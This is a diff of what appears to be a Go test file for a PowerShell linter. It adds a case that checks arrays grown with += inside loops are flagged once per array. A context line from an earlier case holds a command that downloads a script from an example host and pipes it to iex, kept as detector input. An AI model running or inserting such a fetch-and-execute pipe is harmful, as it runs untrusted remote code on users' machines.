@@ -34,6 +34,30 @@ Invoke-WebRequest https://example.com/i.ps1 | iex
 			want: []string{"powershell.invoke-expression:1", "powershell.invoke-expression:2"},
 		},
 		{
+			name: "array grown with += in a loop, once per array",
+			src: `$out = @()
+foreach ($i in $items) {
+    $out += $i
+    $out += $i.Name
+}
+$total = 0
+$names = "a"
+for ($j = 0; $j -lt 3; $j++) { $total += $j; $names += "b" }
+$once = @()
+$once += 1
+function Get-X {
+    $rows = @( )
+    Get-Item * | ForEach-Object { $rows += $_ }
+    while ($true) { $rows += 1 }
+}
+function Get-Y {
+    $seen = @()
+    while ($true) { $seen += 1 }
+}
+`,
+			want: []string{"powershell.array-append-in-loop:13", "powershell.array-append-in-loop:18", "powershell.array-append-in-loop:3"},
+		},
+		{
 			name: "empty catch, but not one with a comment saying why",
 			src: `try { Get-Item x } catch { }
 try { Get-Item y } catch {
